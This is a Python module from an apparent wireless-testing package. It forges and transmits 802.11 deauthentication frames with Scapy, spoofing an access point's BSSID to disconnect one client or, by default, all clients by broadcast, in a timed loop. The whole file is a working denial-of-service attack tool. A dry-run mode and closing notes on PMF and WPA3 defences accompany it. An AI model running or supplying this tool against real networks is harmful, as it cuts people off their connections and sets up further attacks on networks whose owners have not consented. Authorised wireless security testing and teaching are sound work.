"""Deauthentication frame engine.

Crafts and (optionally) transmits 802.11 deauthentication frames for
authorised security testing and education.  A dry-run mode is available so
packet construction and statistics can be demonstrated without transmitting.
"""

import importlib.util
import time
from typing import Callable, Dict, Optional

from sting import DEAUTH_REASON_CODES
from sting.ieee80211 import BROADCAST_MAC, is_broadcast_mac, normalize_mac
from sting.system import set_channel

# Scapy is imported lazily so dry-run mode works without it and so importing
# the package does not trigger Scapy's platform warnings.
HAVE_SCAPY = importlib.util.find_spec("scapy") is not None
_scapy_cache = None


def _load_scapy():
    """Import and cache the Scapy symbols used by the engine."""
    global _scapy_cache
    if _scapy_cache is None:
        from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
        _scapy_cache = (Dot11, Dot11Deauth, RadioTap, sendp)
    return _scapy_cache


class DeauthEngine:
    """Engine for building and sending deauthentication frames."""

    def __init__(
        self,
        interface: str,
        ap_bssid: str,
        ap_ssid: str,
        target_mac: str = BROADCAST_MAC,
        channel: int = 1,
        reason_code: int = 7,
        verbose: bool = False,
        dry_run: bool = False,
    ):
        if not HAVE_SCAPY and not dry_run:
            raise RuntimeError(
                "Scapy is required for packet crafting. Install with: pip install scapy"
            )

        self.interface = interface
        self.ap_bssid = normalize_mac(ap_bssid)
        self.ap_ssid = ap_ssid
        self.target_mac = normalize_mac(target_mac)
        self.channel = int(channel) if channel is not None else 0
        self.reason_code = int(reason_code)
        self.verbose = verbose
        self.dry_run = dry_run

        if not 0 <= self.reason_code <= 65535:
            raise ValueError(f"Reason code out of range: {self.reason_code}")
        if self.channel < 0:
            raise ValueError(f"Invalid channel: {self.channel}")

        self.packets_sent = 0
        self.cycles = 0
        self.start_time: Optional[float] = None
        self.end_time: Optional[float] = None
        self.errors = 0

    # -- packet construction -------------------------------------------------

    def _build_packet(self):
        """Build the deauthentication packet."""
        if not HAVE_SCAPY:
            return None

        Dot11, Dot11Deauth, RadioTap, _ = _load_scapy()
        packet = (
            RadioTap()
            / Dot11(
                type=0,       # Management frame
                subtype=12,   # Deauthentication
                addr1=self.target_mac,
                addr2=self.ap_bssid,
                addr3=self.ap_bssid,
            )
            / Dot11Deauth(reason=self.reason_code)
        )

        if self.verbose:
            print("[VERBOSE] Packet structure:")
            print("  [RadioTap] radio metadata")
            print("  [Dot11] type=0 (Mgmt) subtype=12 (Deauth)")
            print(f"    addr1 (RA/DA) = {self.target_mac}")
            print(f"    addr2 (TA/SA) = {self.ap_bssid}")
            print(f"    addr3 (BSSID) = {self.ap_bssid}")
            print(f"  [Dot11Deauth] reason={self.reason_code} "
                  f"({DEAUTH_REASON_CODES.get(self.reason_code, 'Unknown')})")

        return packet

    def _send_packet(self, packet, count: int = 1) -> None:
        """Send *count* frames, updating statistics."""
        if self.dry_run:
            self.packets_sent += count
            return

        try:
            _, _, _, sendp = _load_scapy()
            sendp(packet, iface=self.interface, count=count, inter=0.01,
                  verbose=False)
            self.packets_sent += count
        except PermissionError:
            print("[!] Permission denied. Run with root/administrator privileges.")
            raise
        except Exception as exc:
            self.errors += 1
            if self.verbose:
                print(f"[VERBOSE] Send error: {exc}")

    def _set_channel(self) -> None:
        """Tune the interface to the target channel."""
        if self.channel <= 0:
            return
        if not set_channel(self.interface, self.channel) and self.verbose:
            print(f"[VERBOSE] Could not set channel {self.channel} on {self.interface}.")

    # -- main loop -----------------------------------------------------------

    def run_loop(
        self,
        count: int = 3,
        delay: float = 0.1,
        stop_flag: Optional[Callable[[], bool]] = None,
        duration: Optional[float] = None,
    ) -> None:
        """Run the deauth loop until stopped, interrupted, or *duration* elapses.

        Args:
            count: Frames to send per cycle (must be >= 1).
            delay: Seconds to sleep between cycles.
            stop_flag: Callable returning True when a stop has been requested.
            duration: Optional total run time in seconds.
        """
        if count < 1:
            raise ValueError("count must be at least 1")
        if delay < 0:
            raise ValueError("delay cannot be negative")
        if duration is not None and duration <= 0:
            raise ValueError("duration must be positive")

        self.start_time = time.time()
        if not self.dry_run:
            self._set_channel()

        if self.verbose:
            print("[VERBOSE] Crafting deauth packet...")
        packet = self._build_packet()
        if self.verbose and packet is not None:
            print(f"[VERBOSE] Packet size: {len(packet)} bytes")
            print(f"[VERBOSE] Delay between cycles: {delay}s")
        if self.dry_run:
            print("[*] DRY RUN: no frames will be transmitted.")
        print()

        target = "ALL CLIENTS (broadcast)" if is_broadcast_mac(self.target_mac) else self.target_mac
        print(f"[>] Deauth: {self.ap_ssid} [{self.ap_bssid}] -> {target}")
        print(f"    Reason: {self.reason_code} "
              f"({DEAUTH_REASON_CODES.get(self.reason_code, 'Unknown')})")
        print(f"    Channel: {self.channel} | Interface: {self.interface}")
        if duration is not None:
            print(f"    Duration: {duration:g}s")
        print()

        # Channel tuning and packet construction are setup work; the attack
        # timer starts once the loop is ready to transmit.
        self.start_time = time.time()
        deadline = self.start_time + duration if duration is not None else None

        status_printed = False
        try:
            while True:
                if stop_flag is not None and stop_flag():
                    break
                now = time.time()
                if deadline is not None and now >= deadline:
                    break

                self._send_packet(packet, count)
                self.cycles += 1

                if self.cycles % 10 == 0:
                    elapsed = now - self.start_time
                    rate = self.packets_sent / elapsed if elapsed > 0 else 0
                    print(f"[*] Cycle {self.cycles} | {self.packets_sent} packets "
                          f"sent | {rate:.0f} pkt/s | {elapsed:.1f}s elapsed",
                          end="\r", flush=True)
                    status_printed = True

                sleep_for = delay
                if deadline is not None:
                    sleep_for = min(delay, max(0.0, deadline - time.time()))
                if sleep_for > 0:
                    time.sleep(sleep_for)
                elif deadline is not None and time.time() >= deadline:
                    break
        finally:
            self.end_time = time.time()
            if status_printed:
                print()

    # -- statistics ----------------------------------------------------------

    def _elapsed(self) -> float:
        if self.start_time is None:
            return 0.0
        end = self.end_time if self.end_time is not None else time.time()
        return max(0.0, end - self.start_time)

    def to_dict(self) -> Dict:
        """Return attack statistics as a JSON-serialisable dictionary."""
        elapsed = self._elapsed()
        return {
            "ap_ssid": self.ap_ssid,
            "ap_bssid": self.ap_bssid,
            "target_mac": self.target_mac,
            "reason_code": self.reason_code,
            "reason": DEAUTH_REASON_CODES.get(self.reason_code, "Unknown"),
            "channel": self.channel,
            "interface": self.interface,
            "cycles": self.cycles,
            "packets_sent": self.packets_sent,
            "errors": self.errors,
            "duration_seconds": round(elapsed, 3),
            "avg_rate": round(self.packets_sent / elapsed, 1) if elapsed > 0 else 0,
            "dry_run": self.dry_run,
        }

    def print_stats(self) -> None:
        """Print final attack statistics and educational notes."""
        stats = self.to_dict()
        print()
        print("[*] === Deauth Attack Summary ===")
        print(f"    Target AP:     {stats['ap_ssid']} ({stats['ap_bssid']})")
        print(f"    Target STA:    {stats['target_mac']}")
        print(f"    Reason code:   {stats['reason_code']} ({stats['reason']})")
        print(f"    Channel:       {stats['channel']}")
        print(f"    Interface:     {stats['interface']}")
        print(f"    Cycles:        {stats['cycles']}")
        label = "Packets simulated" if self.dry_run else "Packets sent"
        print(f"    {label + ':':<15} {stats['packets_sent']}")
        print(f"    Errors:        {stats['errors']}")
        print(f"    Duration:      {stats['duration_seconds']:.1f}s")
        if stats["avg_rate"]:
            print(f"    Avg rate:      {stats['avg_rate']:.0f} pkt/s")
        print()

        if self.verbose:
            print("[*] === Packet Breakdown ===")
            print("    [RadioTap]  20-26 bytes (radio metadata)")
            print("    [Dot11]     24 bytes (MAC header)")
            print("      Frame Control: type=0 (Management) subtype=12 (Deauth)")
            print(f"      addr1 = {self.target_mac}  (Receiver / Destination)")
            print(f"      addr2 = {self.ap_bssid}    (Transmitter / Source)")
            print(f"      addr3 = {self.ap_bssid}    (BSSID)")
            print("      Sequence Control: auto-incremented by the NIC")
            print("    [Dot11Deauth] 2 bytes (Fixed parameters)")
            print(f"      Reason Code: {self.reason_code} "
                  f"({DEAUTH_REASON_CODES.get(self.reason_code, 'Unknown')})")
            print("    Total: ~48-50 bytes per packet")
            print()

        print("[*] === Educational Notes ===")
        print("    1. Deauth packets are UNENCRYPTED management frames")
        print("    2. Without PMF (802.11w), APs accept plaintext deauth frames")
        print("    3. With PMF enabled, deauth frames must be encrypted with PTK")
        print("    4. Without the PTK (pre-shared key), forged deauths are rejected")
        print("    5. WPA3 requires PMF - making deauth attacks ineffective")
        print("    6. 2026 WiFi standards mandate PMF for all new certifications")
        print()
